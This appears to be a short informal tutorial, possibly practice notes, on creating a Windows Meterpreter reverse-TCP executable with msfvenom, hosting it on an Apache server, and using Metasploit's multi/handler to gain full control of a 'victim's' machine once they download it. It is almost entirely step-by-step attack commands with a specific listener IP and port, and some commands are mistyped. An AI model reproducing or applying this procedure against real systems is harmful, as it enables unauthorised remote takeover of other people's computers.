Firstly we need to create a payload which uses reverse TCP connection and we have to declare the type of OS on which this payload is going to work and we also have to define the type of payload to be created,
like for windows the extension of the file will be .exe and for android it will be .apk

note - All this should be done in kali linux terminal

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.203.132 LPORT=4564 --format=exe > practice.exe
 
here we have declared the local host IP as well as  local port for the payload to enter the victim's system.



now in new terminal we have to start our apache server, on which we upload our payload
we can check the status of apache server by using -
service apache2 status                                                                           
if the server is not running then we can start the server by using- 
service apache2 start


our payload and server is ready.

now to exploit our payload we use msfconsole which contains exploit multi handler
we can launch the msf console by using the command 

msfconsole 

note- launch this in new terminal

in msfconsole use exploit/multi/handler

set the payload,lhsot,lport in msfconsole by using the following commands-

set-p windows/meterpreter/reverse_tcp
set LPORT = 4564
set LHOST = 192.168.203.132

after setting up all things exploit the payload by using -
exploit


now download the file in the victim's machine 
as soon as the victim download the payload, the victim's machine got hacked and we get full access of the machine.
